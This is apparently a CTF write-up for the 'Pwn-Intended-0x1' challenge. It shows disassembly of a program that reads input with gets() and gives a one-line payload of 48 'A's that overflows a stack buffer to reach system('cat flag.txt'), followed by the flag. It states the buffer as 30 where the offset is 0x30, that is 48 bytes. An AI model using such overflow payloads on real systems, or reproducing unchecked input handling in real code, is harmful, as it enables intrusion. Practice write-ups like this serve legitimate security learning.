---
layout: post
title: "Pwn-Intended-0x1"
author: "AnandSaminathan"
tags: ['Pwn']
---

**Files**
- [pwn-intended-0x1]({{site.baseurl}}/assets/Pwn-Intended-0x1/pwn-intended-0x1)

## Solution

This is exactly same as [coffer-overflow-0](https://dunsp4rce.github.io/redpwn-2020/pwn/2020/06/26/coffer-overflow-0.html) from redpwn-2020. 
Have to overwrite a variable with any value (other than zero).

```
   	mov    rax,QWORD PTR [rip+0x2ef4]        
   	mov    esi,0x0
   	mov    rdi,rax
   	call   0x401040 <setbuf@plt>
   	mov    rax,QWORD PTR [rip+0x2ef0]        
   	mov    esi,0x0
   	mov    rdi,rax
   	call   0x401040 <setbuf@plt>
   	mov    rax,QWORD PTR [rip+0x2eec]        
   	mov    esi,0x0
   	mov    rdi,rax
   	call   0x401040 <setbuf@plt>
   	lea    rdi,[rip+0xe60]        
   	call   0x401030 <puts@plt>
   	lea    rax,[rbp-0x30]
   	mov    rdi,rax
   	mov    eax,0x0
   	call   0x401060 <gets@plt>
   	lea    rdi,[rip+0xe5f]        
   	call   0x401030 <puts@plt>
   	cmp    DWORD PTR [rbp-0x4],0x0
   	je     0x4011ed <main+151>
   	lea    rdi,[rip+0xe59]        
   	call   0x401030 <puts@plt>
   	lea    rdi,[rip+0xe94]        
   	mov    eax,0x0
   	call   0x401050 <system@plt> # system("cat flag.txt")
   	mov    eax,0x0
```

The buffer size is 30, so any input of size >= 48 (multiple of 16) should print the flag. This worked:

```shell
python2 -c "print 'A'*48" | ./pwn-intended-0x1 
```

## Flag

```
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```

